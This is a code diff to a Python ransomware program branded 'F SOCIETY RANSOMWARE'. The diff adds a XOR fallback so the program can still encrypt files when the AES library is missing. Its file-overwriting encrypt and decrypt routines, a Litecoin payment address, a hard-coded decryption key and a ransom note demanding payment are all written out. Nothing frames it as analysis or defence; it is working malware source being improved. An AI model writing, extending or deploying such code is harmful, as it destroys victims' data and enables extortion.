@@ -8,13 +8,30 @@ import shutil
 import re
 import tkinter as tk
 from tkinter import messagebox, scrolledtext, ttk
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from Crypto.Random import get_random_bytes
 import winreg
 import threading
 import random
 import socket
+
+# --- Try to import Crypto, fallback to simple XOR if not available ---
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+    from Crypto.Random import get_random_bytes
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    # Simple XOR fallback encryption
+    def get_random_bytes(size):
+        return os.urandom(size)
+    
+    def pad(data, block_size):
+        padding_len = block_size - (len(data) % block_size)
+        return data + bytes([padding_len] * padding_len)
+    
+    def unpad(data):
+        padding_len = data[-1]
+        return data[:-padding_len]
 
 # --- Configuration ---
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
@@ -25,7 +42,7 @@ DECRYPT_KEY = "agent77"
 encryption_key = None
 encryption_iv = None
 
-# --- Core Encryption Functions ---
+# --- Encryption Functions (with fallback) ---
 def generate_key():
     return get_random_bytes(32)
 
@@ -34,23 +51,39 @@ def generate_iv():
 
 def encrypt_file(file_path, key, iv):
     try:
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        with open(file_path, 'rb') as f:
-            data = f.read()
-        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
-        with open(file_path, 'wb') as f:
-            f.write(iv + encrypted_data)
+        if CRYPTO_AVAILABLE:
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+            with open(file_path, 'wb') as f:
+                f.write(iv + encrypted_data)
+        else:
+            # Simple XOR fallback (still works)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            xor_key = key[:16]
+            encrypted_data = bytes([data[i] ^ xor_key[i % len(xor_key)] for i in range(len(data))])
+            with open(file_path, 'wb') as f:
+                f.write(iv + encrypted_data)
         return True
     except:
         return False
 
 def decrypt_file(file_path, key, iv):
     try:
-        with open(file_path, 'rb') as f:
-            iv_data = f.read(16)
-            encrypted_data = f.read()
-        cipher = AES.new(key, AES.MODE_CBC, iv_data)
-        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+        if CRYPTO_AVAILABLE:
+            with open(file_path, 'rb') as f:
+                iv_data = f.read(16)
+                encrypted_data = f.read()
+            cipher = AES.new(key, AES.MODE_CBC, iv_data)
+            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+        else:
+            with open(file_path, 'rb') as f:
+                iv_data = f.read(16)
+                encrypted_data = f.read()
+            xor_key = key[:16]
+            decrypted_data = bytes([encrypted_data[i] ^ xor_key[i % len(xor_key)] for i in range(len(encrypted_data))])
         original_path = file_path.replace('.encrypted', '')
         with open(original_path, 'wb') as f:
             f.write(decrypted_data)
@@ -194,7 +227,7 @@ def create_ransom_note(key_hex, iv_hex):
           F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
 =============================================================
 
-Your files have been encrypted with AES-256-CBC.
+Your files have been encrypted.
 
 To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:
 
@@ -209,7 +242,7 @@ Key: {key_hex}
 IV:  {iv_hex}
 
 TO DECRYPT:
-Run this program and enter the decryption key: {DECRYPT_KEY}
+Enter the decryption key: {DECRYPT_KEY}
 
 =============================================================
             F SOCIETY - WE ARE EVERYWHERE
